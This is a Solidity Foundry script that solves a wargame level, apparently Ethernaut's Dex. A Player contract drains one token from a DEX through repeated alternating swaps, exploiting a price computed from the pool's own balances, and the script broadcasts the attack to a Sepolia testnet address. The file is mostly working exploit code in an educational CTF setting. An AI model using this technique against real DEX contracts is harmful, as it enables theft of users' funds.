// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level22Dex.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective:
// The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
// You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
// You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

// Soluition:
// The vulnerability in the Dex contract is that the price of the tokens is calculated based on the
// current balance of the tokens in the contract. By repeatedly swapping small amounts of tokens,
// we can manipulate the price to our advantage. The key is to alternate swaps between the two
// tokens, which causes the price to swing back and forth, allowing us to drain one of the tokens
// from the contract.

/*
    |Dex	            |User
    ----------------------------------	
    |token1  |token2	|token1	|token2
    ----------------------------------
    |100	  |100	    |10	    |10
    |110      |90	    |0	    |20
    |86	      |110	    |24	    |0
    |110	  |80	    |0	    |30
    |69	      |110	    |41	    |0
    |110	  |45	    |0	    |65
    |0	      |90	    |110	|20
 */

contract Player {
    function attack(Dex dex) external {
        SwappableToken token1 = SwappableToken(dex.token1());
        SwappableToken token2 = SwappableToken(dex.token2());

        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        dex.swap(
            address(token1),
            address(token2),
            token1.balanceOf(address(this))
        );
        dex.swap(
            address(token2),
            address(token1),
            token2.balanceOf(address(this))
        );
        dex.swap(
            address(token1),
            address(token2),
            token1.balanceOf(address(this))
        );
        dex.swap(
            address(token2),
            address(token1),
            token2.balanceOf(address(this))
        );
        dex.swap(
            address(token1),
            address(token2),
            token1.balanceOf(address(this))
        );
        dex.swap(address(token2), address(token1), 45);
        console.log("Token1 balance", token1.balanceOf(address(dex)));
        console.log("Token2 balance", token2.balanceOf(address(dex)));
    }
}

contract Level22Solution is Script {
    Dex public dex = Dex(payable(0x91aFCc757faAe253D2F63672518b2D4f1D51E103));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());
        Player player = new Player();
        token1.approve(address(player), type(uint256).max);
        token2.approve(address(player), type(uint256).max);

        player.attack(dex);

        vm.stopBroadcast();
    }
}
// forge script script/Level22Solution.s.sol:Level22Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
